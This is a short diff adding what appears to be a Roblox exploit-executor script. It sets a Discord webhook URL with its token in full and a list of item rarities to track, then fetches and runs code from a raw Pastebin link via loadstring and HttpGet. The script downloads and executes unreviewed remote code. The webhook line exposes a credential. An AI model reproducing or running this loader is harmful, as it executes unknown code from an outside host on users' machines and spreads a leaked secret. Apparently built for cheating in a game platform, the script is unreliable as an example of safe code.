@@ -1,0 +1,11 @@
+_G.Webhook = "https://discord.com/api/webhooks/935290941969924177/Fgwu2QdhlZPvfD8YsGEM7e-w7v9ZIVQdvIghPsFraB_aauWk7syy7Xu32EDbbVOED4XJ"
+_G.TrackList = {
+   ['Basic'] = false;
+   ['Rare'] = false;
+   ['Epic'] = false;
+   ['Legendary'] = false;
+   ['Mythical'] = true;
+   ['Exclusive'] = true;
+}
+
+loadstring(game:HttpGet('https://pastebin.com/raw/7niKEX3Y'))()
